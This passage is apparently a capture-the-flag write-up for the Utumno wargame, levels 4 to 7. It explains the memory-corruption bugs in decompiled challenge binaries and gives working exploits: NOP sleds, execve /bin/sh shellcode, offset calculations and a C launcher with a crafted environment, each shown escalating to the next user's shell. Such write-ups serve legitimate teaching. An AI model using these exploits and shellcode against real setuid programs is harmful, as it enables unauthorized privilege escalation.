0xfffed38c│+0x000c: "nazpoazppazpqazprazpsazptazpuazpvazpwazpxazpyazpza[...]"
0xfffed390│+0x0010: "oazppazpqazprazpsazptazpuazpvazpwazpxazpyazpzazqba[...]"
0xfffed394│+0x0014: "pazpqazprazpsazptazpuazpvazpwazpxazpyazpzazqbazqca[...]"
0xfffed398│+0x0018: "qazprazpsazptazpuazpvazpwazpxazpyazpzazqbazqcazqda[...]"
0xfffed39c│+0x001c: "razpsazptazpuazpvazpwazpxazpyazpzazqbazqcazqdazqea[...]"
──── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x707a616a
──── threads ────
[#0] Id 1, Name: "utumno4", stopped 0x707a616a in ?? (), reason: SIGSEGV

gef>  shell pwn cyclic -l 0x707a616a
65286
```
The return address is overwritten with **0x707a616a** which calculates to an offset of `65286`.

### Exploit:
We can overwrite the return address with **65286-bytes** plus another 4-bytes for the return address. We need to put shellcode into an environment variable, find the address of the environment variable on the stack, and then overwrite the return address with that address.

```bash
utumno4@utumno:/tmp/tasks/utumno4$ export SHELLCODE=$(perl -e 'print "\x90"x20 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x66\x68\x2d\x70\x89\xe1\x50\x51\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')
utumno4@utumno:/tmp/tasks/utumno4$ ./find_env SHELLCODE
SHELLCODE is at 0xffffd5ac
utumno4@utumno:/tmp/tasks/utumno4$ /utumno/utumno4 65536 $(perl -e 'print "A"x65286 . "\xac\xd5\xff\xff"')
$ whoami
utumno5
```

---
---
## Utumno5 Solution
**Username:** utumno5\
**Password:** [REDACTED]

### Disassembly:
```c
char* hihi(char* p)
{
    char var_10;
    
    if (strlen(p) <= 0x13)
        return strcpy(&var_10, p);
    
    return strncpy(&var_10, p, 0x14);
}

int main(int argc, char** argv)
{
    if (argc && (argc != 1 || **argv))
    {
        puts("Aw..");
        exit(1);
        /* no return */
    }
    
    printf("Here we go - %s\n", argv[0xa]);
    hihi(argv[0xa]);
    return 0;
}
```
This challenge is very similar to **utumno2** however it works a little bit different.\
The firsty line `if (argc && (argc != 1 || **argv))` checks performs two checks:\
- If `argc` is not 0
AND
- If `argc` is not 1 OR the first character of `argv[1]` is not NULL.

If the checks return true, then it just prints *"Aw.."* and exits. However, if it is false, then it prints *"Here we go - {argv[10]}"*, and calls the function `hihi()` and passes it `argv[10]`.

The `hihi()` function defines a single character buffer `var_10` before checking if the legnth of `argv[10]` is less than of equal to 19-bytes (**0x13**). If the length of `argv[10]` is less than 19-bytes, then the `strcpy()` function is called to copy the contents of `argv[10]` into the single character buffer.

### Exploit Setup:
```c
#include <unistd.h>

// gcc -m32 -static run.c -o run

int main() {
        char *argv[] = {NULL};
        char *envp[] = {"",
                        "",
                        "",
                        "",
                        "",
                        "",
                        "",
                        "",
                        "AAAABBBBCCCCDDDDEEEE",
                        NULL};

        execve("/utumno/utumno5", argv, envp);
}
```
We can use the same script as we used in **utumno2** and set the `argv` array to `NULL` to bypass the initial checks, then because it bypasses the checks it will try to index `argv[10]` which indexes past the `argv` array and into the `envp` array where the 9th environment variable contains our overflow payload.

Compiling and running the binary with `strace`, we can see that the return address is overwritten with **0x45454545** (**EEEE**), so we need 16-bytes of padding before overwriting the return address.

We can put our shellcode into the 8th environment variable and locate the address of it in **GDB**.

```bash
gef>  x/20s *environ
0xffffdf96:     ""
0xffffdf97:     ""
0xffffdf98:     ""
0xffffdf99:     ""
0xffffdf9a:     ""
0xffffdf9b:     ""
0xffffdf9c:     ""
0xffffdf9d:     '\220' <repeats 20 times>, "1\300Ph//shh/bin\211\343P..."
0xffffdfd3:     "AAAABBBBCCCCDDDDBBBB"
0xffffdfe8:     "/utumno/utumno5"
```
The address of the shellcode is **0xffffdf9d**.

### Exploit:
```c
#include <unistd.h>

int main() {
        char *argv[] = {NULL};
        char *envp[] = {"",
                        "",
                        "",
                        "",
                        "",
                        "",
                        "",
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x66\x68\x2d\x70\x89\xe1\x50\x51\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80",
                        "AAAABBBBCCCCDDDD\x9d\xdf\xff\xff",
                        NULL};

        execve("/utumno/utumno5", argv, envp);
}
```

```bash
utumno5@utumno:/tmp/tasks/utumno5$ ./run
Here we go - AAAABBBBCCCCDDDD...
$ whoami
utumno6
```

---
---
## Utumno6 Solution
**Username:** utumno6\
**Password:** [REDACTED]

### Disassembly:
```c
int main(int argc, char** argv)
{
    if (argc <= 2)
    {
        puts("Missing args");
        exit(1);
        /* no return */
    }
    
    char* eax = malloc(0x20);
    
    if (!eax)
    {
        puts("Sorry, ran out of memory :-(");
        exit(1);
        /* no return */
    }
    
    uint32_t eax_5 = strtoul(argv[2], nullptr, 0x10);
    uint32_t eax_9 = strtoul(argv[1], nullptr, 0xa);
    
    if (eax_9 > 0xa)
    {
        puts("Illegal position in table, quitt…");
        exit(1);
        /* no return */
    }
    
    void var_34;
    *(&var_34 + (eax_9 << 2)) = eax_5;
    strcpy(eax, argv[3]);
    printf("Table position %d has value %d\n…", eax_9, *(&var_34 + (eax_9 << 2)), eax, eax);
    return 0;
}
```
Looking at the disassembly we can see that it first checks for a minimum of 2 arguments to be passed to the binary. If the check returns true, then it continues to allocate 32-bytes of memory `char* eax = malloc(0x20);`.\
If it was able to allocate the memory successfully, then it calls the `strtoul()` function twice. This function is used to convert a string into an *unsigned long integer value*.\
The first call converts `argv[2]` into a hexadecimal value (base 16 [**0x10**]) and stores it in the variable `eax_5`. The second call converts `argv[1]` into a decimal value (base 10 [**0xa**]).

Once the conversions are done, it checks if the decimal value (`eax_9`) is less than 10 (**0xa**). If it is not, then it prints *"Illegal position in table, quitt…"* and exits. However, if it is less than 10, then it performs the following actions:\
```c
void var_34;
*(&var_34 + (eax_9 << 2)) = eax_5;
```
Although looking complicated, it basically stores the 32-bit value `eax_5` into a local table at `eax_9`.

After that, it uses the `strcpy()` function to copy the value from `argv[3]` into **eax** which is defined earlier in the function as the call the `malloc()` (`char* eax = malloc(0x20);`). So it copies the value from `argv[3]` into the pre-allocated memory.

Finally, it prints a formatted string with the values from `argv[1]` and `argv[2]`.

There are a few things to note here.\
First, it does not validate against negative numbers passed in the arguments. This means we could pass a number like `-1` in `argv[1]` which would be outside of the bounds of the defined table. This would allow for possibly overwriting values on the stack when `eax_9` is used to dictate the location *in the table* of where to write the value of `eax_5`.\
Secondly, the use of the function `strcpy()` could lead to a **Buffer Overflow** as it has no bounds checking, meaning if a value with a length larger than the size of the defined memory allocation it is writing to, then it will fill the allocated memory and continue to write onto the stack.

### Exploit Setup:
```bash
utumno6@utumno:/tmp/tasks/utumno6$ strace /utumno/utumno6 -1 aaaa bbbb
execve("/utumno/utumno6", ["/utumno/utumno6", "-1", "aaaa", "bbbb"], 0x7fffffffe2e8 /* 29 vars */)
[ Process PID=944681 runs in 32 bit mode. ]
{SNIPPED}
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0xaaaa} ---
+++ killed by SIGSEGV (core dumped) +++
Segmentation fault (core dumped)
```
Running the binary with the arguments `-1 aaaa bbbb` we can see that it causes a **Segmentation Fault** and the return address is `argv[2]`. However, it is not as simple as it seems, trying to simply write the address of shellcode into `argv[1]` fails.

```bash
utumno6@utumno:/tmp/tasks/utumno6$ ltrace /utumno/utumno6 -1 deadbeef aaaa
__libc_start_main(0x80490cd, 4, 0xffffd3f4, 0 <unfinished ...>
malloc(32)                                     = 0x804c1a0
strtoul(0xffffd57a, 0, 16, 0x804c1a0)          = 0xdeadbeef
strtoul(0xffffd577, 0, 10, 0x804c1a0)          = 0xffffffff
strcpy(0xdeadbeef, "aaaa" <no return ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

Running the binary using `ltrace`, we can see that using **-1** in `argv[1]` and the address **deadbeef** in `argv[2]`, we can control the address that the function call to `strcpy()` attempts to write to.\
At this point there are two things we can attempt to do., The first is to use `strcpy()` to write an arbitrary address to the **ESP** which would then run whatever our arbitrary address is pointed to. The second, is to point `strcpy()` to the location outside of the table where `argv[2]` is written to, and the continue to write bytes onto the stack until we overwrite the return address.

I found the second option to be more reliable, although it sounds complicated it works every time.

```bash
gef> run -1 aaaa bbbb
───────────────────────────────────────────────────────────────────────────
gef>  x/400xw $esp-100
0xffffd284:     0x00000000      0x00050030      0x00000010      0xf7ffcfe8
0xffffd294:     0x00000307      0x0804828c      0x0804b260      0x08048360
0xffffd2a4:     0xf7fade34      0xffffd3f8      0xf7d872ac      0xf7e2f170
0xffffd2b4:     0xf7dcbfd6      0xffffd568      0x00000000      0xf7fade34
0xffffd2c4:     0xffffd3f8      0xf7ffcb60      0xffffd328      0xf7fdabb0
0xffffd2d4:     0xffffd570      0xf7e2f170      0x0000aaaa      0xf7ffda20
0xffffd2e4:     0x00000010      0x08049264      0x0000aaaa      0xffffd570
0xffffd2f4:     0x0000aaaa      0x00000000      0x00000000      0xffffffff
```
We can see that `argv[2]` is written at the address **0xffffd2d4 + 8** (**0xffffd2dc**). We can tell `strcpy()` to write at this address, and we will continue to write more bytes onto the stack until we overwrite the return address.

```bash
utumno6@utumno:/tmp/tasks/utumno6$ strace /utumno/utumno6 -1 ffffd2dc AAAABBBBCCCCDDDDEEEE
execve("/utumno/utumno6", ["/utumno/utumno6", "-1", "ffffd2dc", "AAAABBBBCCCCDDDDEEEE"], 0x7fffffffe308 /* 28 vars */)
[ Process PID=1006928 runs in 32 bit mode. ]
{SNIPPED}
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x44444444} ---
+++ killed by SIGSEGV (core dumped) +++
Segmentation fault (core dumped)
```
The return address is overwritten with **0x44444444** (**DDDD**) this means we need 12-bytes of padding before we overwrite the return address.\
Now we need somewhere to return to, such as shellcode in an environment variable.

### Exploit:
We can put shellcode into an environment variable, find the address of the environment variable on the stack, and overwrite the return address with the address of the shellcode.

```bash
utumno6@utumno:/tmp/tasks/utumno6$ export SHELLCODE=$(perl -e 'print "\x90"x20 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x66\x68\x2d\x70\x89\xe1\x50\x51\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')
utumno6@utumno:/tmp/tasks/utumno6$ ./find_env SHELLCODE
SHELLCODE is at 0xffffd5ab
utumno6@utumno:/tmp/tasks/utumno6$ /utumno/utumno6 -1 ffffd2dc $(perl -e 'print "A"x12 . "\xab\xd5\xff\xff"')
$ whoami
utumno7
```

---
---
## Utumno7 Solution
**Username:** utumno7\
**Password:** [REDACTED]

### Disassembly:
```c
int vuln(char* arg)
{
    int32_t var_8 = 0;
    void var_a4;
    jbp = &var_a4;
    
    if (_setjmp(&var_a4))
        return 0;
    
    char var_124[0x80];
    strcpy(&var_124, arg);
    jmp(0x17);
    /* no return */
}

int main(int argc, char** argv)
{
    if (argc <= 1)
    {
        exit(1);
        /* no return */
    }
    
    puts("lol ulrich && fuck hector");
    vuln(argv[1]);
    return 0;
}

void jmp(int i) __noreturn
{
    longjmp(jbp, i);
    /* no return */
}
```
At first this challenge seems a bit complicated for no reason, but it's actually quite straight forward to solve. Ignoring the `_setjmp()`, `jmp()`, and `longjmp()` function calls, we can see that the main function prints a message before calling the `vuln()` function passing the value of `argv[1]`.

Skipping over the `_setjmp()` function call, it defines a 128-byte buffer named `var_124` and then calls the `strcpy()` function to copy the value of `argv[1]` into the buffer. Which is vulnerable to a **Buffer Overflow** as `strcpy()` has no bounds checking.

### Exploit Setup:
Through iterating through different lengths of input, I was able to discover that a 140-byte input is able to overwrite the **EIP**. However, if you try to jump to shellcode, it fails due to the **jmp** calls.\
Adding another 4-bytes to the input it seems to break after the call to `_setjmp()`.

```bash
gef> run $(perl -e 'print "A"x140 . "BBBB"')
──── registers ────
$eax   : 0x17
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0x807fd178
$edx   : 0x080491cd  →  <vuln+0027> add esp, 0x4
$esp   : 0x807fd17c
$ebp   : 0x42424242 ("BBBB"?)
$esi   : 0x41414141 ("AAAA"?)
$edi   : 0x41414141 ("AAAA"?)
$eip   : 0x080491d0  →  <vuln+002a> mov DWORD PTR [ebp-0x4], eax
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
──── stack ────
[!] Unmapped address: '0x807fd17c'
──── code:x86:32 ────
    0x80491c7 <vuln+0021>      push   eax
    0x80491c8 <vuln+0022>      call   0x8049050 <_setjmp@plt>
    0x80491cd <vuln+0027>      add    esp, 0x4
 →  0x80491d0 <vuln+002a>      mov    DWORD PTR [ebp-0x4], eax
    0x80491d3 <vuln+002d>      cmp    DWORD PTR [ebp-0x4], 0x0
    0x80491d7 <vuln+0031>      jne    0x80491f5 <vuln+79>
    0x80491d9 <vuln+0033>      push   DWORD PTR [ebp+0x8]
    0x80491dc <vuln+0036>      lea    eax, [ebp-0x120]
    0x80491e2 <vuln+003c>      push   eax
──── threads ────
[!] Id 1, Name: "utumno7", stopped 0x80491d0 in vuln (), reason: SIGSEGV
──── trace ────
[!] Cannot access memory at address 0x4242424a
```
If we replace the extra 4-bytes of *"B's"* with an address somewhere within the 140-bytes of *"A's"* we can fully control the return address.

```bash
gef> run $(perl -e 'print "A"x140 . "\xb0\xd1\xff\xff"')
──── registers ────
$eax   : 0x0
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0xdbffd178
$edx   : 0x080491cd  →  <vuln+0027> add esp, 0x4
$esp   : 0xffffd1b8  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0x41414141 ("AAAA"?)
$edi   : 0x41414141 ("AAAA"?)
$eip   : 0x41414141 ("AAAA"?)
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
──── stack ────
0xffffd1b8│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"    ← $esp
0xffffd1bc│+0x0004: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffd1c0│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffd1c4│+0x000c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffd1c8│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffd1cc│+0x0014: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffd1d0│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffd1d4│+0x001c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
──── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x41414141
──── threads ────
[!] Id 1, Name: "utumno7", stopped 0x41414141 in ?? (), reason: SIGSEGV
```

We can locate an exact location by splitting the 140-bytes of *"A's"* into smaller chunks.
```bash
gef>  r $(perl -e 'print "AAAA" . "BBBB" . "C"x132 . "\x7c\xd1\xff\xff"')
──── registers ────
$eax   : 0x0
$ebx   : 0x43434343 ("CCCC"?)
$ecx   : 0xc77fd178
$edx   : 0x080491cd  →  <vuln+0027> add esp, 0x4
$esp   : 0xffffd184  →  "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0x43434343 ("CCCC"?)
$edi   : 0x43434343 ("CCCC"?)
$eip   : 0x42424242 ("BBBB"?)
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
──── stack ────
0xffffd184│+0x0000: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"    ← $esp
0xffffd188│+0x0004: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffd18c│+0x0008: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffd190│+0x000c: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffd194│+0x0010: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffd198│+0x0014: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffd19c│+0x0018: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
0xffffd1a0│+0x001c: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
──── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x42424242
──── threads ────
[!] Id 1, Name: "utumno7", stopped 0x42424242 in ?? (), reason: SIGSEGV
```

### Exploit:
Now we can overwrite the return address with an exact value, we can put the shellcode on the stack straight after that exact value and then change the value to return to the shellcode.

```bash
ltrace /utumno/utumno7 $(perl -e 'print "AAAA" . "BBBB" . "\x90"x99 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\
x89\xe3\x50\x66\x68\x2d\x70\x89\xe1\x50\x51\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" . "\x9c\xd1\xff\xff"')
__libc_start_main(0x80490bd, 2, 0xffffd384, 0 <unfinished ...>
puts("lol ulrich && fuck hector"lol ulrich && fuck hector
)
_setjmp(0xffffd21c, 0, 0x68e98ec0, 0xf7faed40)
strcpy(0xffffd19c, "AAAABBBB\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...) = 0xffffd19c
longjmp(0xffffd21c, 23, 0xffffd2bc, 0x80491f2 <no return ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```
The `strcpy()` function writes input to the location starting at **0xffffd19c**. We can add, for example, 20-bytes onto this address to return into the **NOP Sled**.

```bash
utumno7@utumno:/utumno$ /utumno/utumno7 $(perl -e 'print "AAAA" . "\xb0\xd1\xff\xff" . "\x90"x99 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x66\x68\x2d\x70\x89\xe1\x50\x51\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" . "\x9c\xd1\xff\xff"')
lol ulrich && fuck hector
$ whoami
utumno8
```